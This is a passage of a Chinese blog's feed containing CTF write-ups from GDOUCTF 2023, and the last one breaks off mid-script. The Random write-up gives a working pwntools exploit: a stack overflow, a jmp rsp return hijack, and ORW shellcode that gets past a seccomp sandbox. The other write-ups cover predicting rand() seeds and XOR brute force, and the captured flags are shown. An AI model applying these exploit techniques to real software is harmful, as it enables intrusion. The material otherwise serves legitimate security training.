中，然后进行查看<br>这里就不解释了</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8614.png" alt="从物理机拖到Linux虚拟机中的文件消失了14.png"></p>]]></content>
    
    
    <summary type="html">有时候明明安装了 VMtools，却发现文件有时还是无法拖进 Linux 虚拟机，或者拖进虚拟机后文件却并没有出现在对应的文件夹里，不要慌，其实虚拟机没有问题，只需要简单操作一下</summary>
    
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>【GDOUCTF 2023】Random</title>
    <link href="https://www.4ss1du0us.cn/2023/0415c7efa2.html"/>
    <id>https://www.4ss1du0us.cn/2023/0415c7efa2.html</id>
    <published>2023-04-26T13:52:37.000Z</published>
    <updated>2023-06-30T11:27:19.654Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>伪随机数结合沙盒保护，<mark>使用 <code>ORW</code> 绕过沙盒</mark></p></li><li><p><mark>栈上空间不够写入，使用 <code>jmp rsp</code> 劫持返回地址</mark></p></li></ul><hr><p><a href="https://www.nssctf.cn/problem/3722">（2023年4月16日）【GDOUCTF 2023】Random</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>分析程序：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM1.png" alt="2023GDOUCTF-RANDOM1.png"></p></li><li><p>用 IDA 分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM2.png" alt="2023GDOUCTF-RANDOM2.png"><br>这个题也用到了猜伪随机数，猜对之后进到 <code>vulnerable()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM3.png" alt="2023GDOUCTF-RANDOM3.png"><br>由于 <code>buf</code> 在栈上的长度是 0x20，这里是可以溢出的<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM9.png" alt="2023GDOUCTF-RANDOM9.png"></p></li><li><p>看看字符串里有没有什么可以利用的<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM5.png" alt="2023GDOUCTF-RANDOM5.png"><br>好像并没有</p></li><li><p>寻找程序自定义的函数，发现程序通过 <code>sandbox()</code> 函数开启了沙盒保护：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM4.png" alt="2023GDOUCTF-RANDOM4.png"><br>使用 <code>prctl()</code> 方式开启的沙盒<br>① <code>prctl(38, 1LL, 0LL, 0LL, 0LL)</code> 中的 38 表示禁用系统调用<br>② <code>prctl(22，2)</code> 表示设置沙盒规则，从而可以实现改变函数的系统调用<br>沙盒保护一般都会限制 <code>execve</code> 的系统调用，例如 <code>one_gadget</code> 和 <code>system</code> 调用，使我们不能正常 <code>get shell</code>，只能通过 <code>ROP</code> 的方式调用 <code>open()</code>、<code>read()</code>、<code>write()</code> 的组合方式来获取 flag</p></li><li><p>使用 <code>seccomp-tools</code> 检查一下程序的沙盒机制<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM6.png" alt="2023GDOUCTF-RANDOM6.png"><br><code>if (A != execve) goto 0005</code> 即 <code>return ALLOW</code>，所以程序禁用了 <code>execve</code>，而 <code>system()</code> 需要通过 <code>execve</code> 来实现</p></li><li><p>自定义函数中还有一个 <code>haha()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM7.png" alt="2023GDOUCTF-RANDOM7.png"><br>给出的是一个汇编指令 <code>__asm &#123; jmp     rsp &#125;</code>，可以跟进获得这条指令所在的地址：<code>0x40094E</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM8.png" alt="2023GDOUCTF-RANDOM8.png"></p></li><li><p>因此本题需要使用 ORW<code>（O -- open，R -- read，W -- write）</code> 来绕过沙盒<br>① 首先通过 <code>ctypes</code> 绕过伪随机数校验，跳转到 <code>vulnerable()</code> 函数，但是这里不能通过溢出执行 shellcode 来提权，因为 <code>system()</code> 被沙盒 Ban 了<br>② 由于栈上写入的长度不够，所以得分两次写<br>③ 填充字符到 <code>0x28</code> 够到返回地址，用 <code>jmp rsp</code> 劫持返回地址，让其继续向下运行<br>④ 找到一个可读可写可执行的地址，用于将读取的 flag 存进去，我这里是 <code>data_address = 0x601000</code><br>⑤ 然后用 <code>open()</code> 打开 flag，<code>read()</code> 读取 flag，<code>write()</code> 写出 flag，构造 ORW</p></li><li><p>但是发现有时候远程的伪随机数打不通，应该是远程靶机的版本问题<br>也可以用爆破的方式绕过</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lease input a guess num:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    return_str <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'guys'</span> <span class="token keyword">in</span> return_str<span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/真男人下120层/bin"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28391</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    v3 <span class="token operator">=</span> lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v3<span class="token punctuation">)</span>    number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please input a guess num:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x40094E</span>data_address <span class="token operator">=</span> <span class="token number">0x601000</span>  <span class="token comment"># 用vmmap找到一个可读可写的段</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 调用read函数，在data_address 0x601000处写入ORW内容</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'mov rax,0x601000; call rax'</span><span class="token punctuation">)</span>  <span class="token comment"># call ax寄存器，调用执行data_address 0x601000处的ORW</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span>  <span class="token comment"># 溢出到buf栈的返回地址，并将返回地址改成jmp_rsp，继续运行当前rsp后续指令，填写别的返回地址就无法控制程序后面的执行流程了</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30; jmp rsp'</span><span class="token punctuation">)</span>  <span class="token comment"># 此时rsp已经离ORW地址偏移0x30,这里把sp挪回到ORW地址并跳转到ORW</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your door\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打开本地的flag文件</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 文件描述符3:其它打开的文件，将flag内容写入到data_address + 0x100地址处</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 文件描述符1:输出到屏幕，输出地址data_address + 0x100处存储的flag内容</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>ORW<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{6a3fa38d-f0fe-4d23-960e-b40c015409fc}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM10.png" alt="2023GDOUCTF-RANDOM10.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中的一道 Pwn 题，考点在于伪随机数绕过和 ORW 沙盒绕过，以及栈上空间不够写入时，使用 `jmp rsp` 劫持返回地址</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>【GDOUCTF 2023】真男人下120层</title>
    <link href="https://www.4ss1du0us.cn/2023/0427972470.html"/>
    <id>https://www.4ss1du0us.cn/2023/0427972470.html</id>
    <published>2023-04-26T09:52:37.000Z</published>
    <updated>2023-06-07T11:59:33.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>使用 <code>ctypes</code> 库生成伪随机数</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】真男人下120层</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>首先查看文件：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%821.png" alt="2023GDOUCTF-真男人就下120层1.png"></p></li><li><p>用 IDA 查看代码逻辑：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%822.png" alt="2023GDOUCTF-真男人就下120层2.png"><br>输出信息有点杂乱，运行程序看一下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%823.png" alt="2023GDOUCTF-真男人就下120层3.png"><br>这样就看得很清楚了，结合代码，程序大意如下：<br>① 首先根据一些数据生成伪随机数种子<br>② 让我们输入满足 <code>if ( rand() % 4 + 1 != v6 )</code> 条件的 <code>v6</code><br>③ 总共有 120 轮这样的校验，如果全部正确就执行 <code>cat_flag()</code> 函数<br><code>cat_flag()</code> 函数如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%824.png" alt="2023GDOUCTF-真男人就下120层4.png"></p></li><li><p>所以接下来思路就很清晰了，按照伪随机数生成的方法构造 exp 重复输入 120 次即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/真男人下120层/bin"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28625</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    v3 <span class="token operator">=</span> lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v3<span class="token punctuation">)</span>    v4 <span class="token operator">=</span> lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">1522127470</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{bc2875e3-3232-4f70-8b78-006e8527f928}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%825.png" alt="2023GDOUCTF-真男人就下120层5.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中的一道 Pwn 题，比较简单，主要是利用 ctypes 生成伪随机数，循环输入 120 次即可得到 flag</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>【GDOUCTF 2023】L!S!</title>
    <link href="https://www.4ss1du0us.cn/2023/04bc1a66dd.html"/>
    <id>https://www.4ss1du0us.cn/2023/04bc1a66dd.html</id>
    <published>2023-04-22T07:36:01.000Z</published>
    <updated>2023-06-07T12:29:35.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>对比两个程序中函数的相似性时，<code>BinDiff</code> 的使用方法</p></li><li><p>遇到未给定或难以确定的数据时，可以通过确定数据的范围，直接进行爆破</p></li><li><p>学到了一种新的转换小端序的方法</p></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】L!S!</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到两个文件：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/GDOUCTF2023-L%21S%211.png" alt="GDOUCTF2023-L!S!1.png"><br>文件名是个提示，<code>ls-original</code> 是原始的文件，<code>ls-patched</code> 是修改后的文件</p></li><li><p><strong>分别在 64 位 IDA 中打开这两个文件，发现他们的主函数内容几乎是一摸一样的</strong><br>（这里不贴图了，主函数特别长，有 1100 多行代码）</p></li><li><p><strong>结合文件的名字，这两个文件可能只有一点细微的差异，其他内容都是一样的</strong></p></li><li><p>识别二进制文件中的差异，可以使用 IDA 的 <code>BinDiff</code> 插件<br>首先下载 <code>BinDiff</code> （<em>在《二进制文件相似性》中有详细介绍</em>）<br>识别结果如下，按相似度低到高排序：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/GDOUCTF2023-L%21S%212.png" alt="GDOUCTF2023-L!S!2.png"><br>发现只有 <code>extract_dirs_from files</code> 这个函数的相似度是 0.84，其他的都是 1<br>所以突破口肯定就在函数 <code>extract_dirs_from files</code> 中了</p></li><li><p>跟进一下<br><code>ls-original</code> 中的函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/GDOUCTF2023-L%21S%213.png" alt="GDOUCTF2023-L!S!3.png"><br><code>ls-patched</code> 中的函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/GDOUCTF2023-L%21S%214.png" alt="GDOUCTF2023-L!S!4.png"></p></li><li><p>两边同时开对比看一下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/GDOUCTF2023-L%21S%215.png" alt="GDOUCTF2023-L!S!5.png"><br>左边多定义了三个变量，继续往下翻，发现差别主要就是在 <code>lmao[]</code> 的地方：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/GDOUCTF2023-L%21S%216.png" alt="GDOUCTF2023-L!S!6.png"><br>黄色框中是相同的地方，主要是多出了红色框中的内容</p></li><li><p>将不同的部分提取出来：</p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">LABEL_7<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3F7D132A2A252822LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span>lmao <span class="token operator">=</span> <span class="token number">0x7D2E370A180F1604LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31207C7C381320LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x392A7F3F39132D13LL</span><span class="token punctuation">;</span>          v18 <span class="token operator">=</span> lmao<span class="token punctuation">;</span>          <span class="token keyword">do</span>            <span class="token operator">*</span>v18<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token operator">*</span>v7<span class="token punctuation">;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">!=</span> v18 <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span>lmao<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li><p>这里 <code>v18</code> 是一个指向 <code>lmao</code> 首地址的指针，而 <code>lmao</code> 的值是由 4 组 8 字节的数据拼接而成（<strong>小端序存放</strong>）<br>（<mark>注意：拼接得到 lmao 的值时，要先对每一组小端序数据进行还原</mark>）<br><code>while ( &amp;lmao[31] != v18 )</code> 控制 do while 循环一直将 <code>lmao</code> 中的所有元素全部与 <code>*v7</code> 的值进行异或<br>然后将异或结果输出</p></li><li><p>但是 <code>*v7</code> 的值在程序中无法得知，所以只能对 <code>*v7</code> 进行爆破<br>而 <code>*v7</code> 的取值只有 256 种可能，从 0 ~ 255</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> width_num<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 将小端序转换为正序  </span>    <span class="token keyword">global</span> <span class="token builtin">buffer</span>      hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 将int数据转换为十六进制的字符串  </span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">!=</span> width_num <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>          hex_str <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>width_num <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 位数不足width的用0凑齐  </span>    index <span class="token operator">=</span> width_num      <span class="token keyword">while</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 每两位string转换为十六进制int型数据  </span>        <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 将int型作为char存入buffer  </span>        index <span class="token operator">-=</span> <span class="token number">2</span>      <span class="token keyword">return</span> <span class="token builtin">buffer</span>      <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment">## 存放结果的列表  </span>  lmao1 <span class="token operator">=</span> <span class="token number">0x7D2E370A180F1604</span>  lmao2 <span class="token operator">=</span> <span class="token number">0x3F7D132A2A252822</span>  lmao3 <span class="token operator">=</span> <span class="token number">0x392A7F3F39132D13</span>  lmao4 <span class="token operator">=</span> <span class="token number">0x31207C7C381320</span>    little_endian<span class="token punctuation">(</span>lmao1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao3<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao4<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>  <span class="token comment"># [4, 22, 15, 24, 10, 55, 46, 125, 34, 40, 37, 42, 42, 19, 125, 63, 19, 45, 19, 57, 63, 127, 42, 57, 32, 19, 56, 124, 124, 32, 49]  </span>  <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 直接爆破key  </span>    flag <span class="token operator">=</span> <span class="token string">""</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key = "</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>      <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token 